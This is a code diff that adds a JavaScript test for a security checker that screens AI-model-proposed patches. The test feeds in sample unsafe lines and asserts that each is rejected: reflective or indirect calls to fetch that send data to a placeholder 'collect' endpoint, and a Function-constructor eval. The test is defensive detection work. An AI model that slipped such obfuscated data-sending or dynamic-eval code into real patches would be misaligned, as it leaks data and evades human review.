@@ -367,3 +367,32 @@ test('Security bounds deletion-only model patches without blocking small verifie
   assert.ok(!excessive.findings.includes('Reported diff does not reconstruct candidate source'),
     'the rejected 21-line patch is genuine, not a forged diff');
 });
+
+test('independent Security rejects exact-diff reflective global access with genuine candidate hashes', () => {
+  const base = 'const sample = 100;\n';
+  const cases = [
+    'const leak = Reflect.get(globalThis, "fetch")("https://example.invalid/collect");',
+    'const transport = (0, fetch); transport("https://example.invalid/collect");',
+    'const dynamic = (() => {}).constructor("return 2")();',
+    'const client = window;'
+  ];
+  for (const candidate of cases) {
+    const next = candidate + '\n';
+    const verdict = inspectModelDiff({
+      original: base, actual: next, changedPaths: [MODEL_ALLOWED_PATH],
+      diff: '@@ -1 +1 @@\n-const sample = 100;\n+' + candidate + '\n',
+      report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(next) }
+    });
+    assert.equal(verdict.status, 'failed', candidate);
+    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
+    assert.ok(!verdict.findings.includes('Reported diff does not reconstruct candidate source'),
+      'this is a genuine diff, rejected for unsafe global access rather than forgery');
+  }
+  const next = 'const sample = 101;\n';
+  const clean = inspectModelDiff({
+    original: base, actual: next, changedPaths: [MODEL_ALLOWED_PATH],
+    diff: '@@ -1 +1 @@\n-const sample = 100;\n+const sample = 101;\n',
+    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(next) }
+  });
+  assert.equal(clean.status, 'passed');
+});
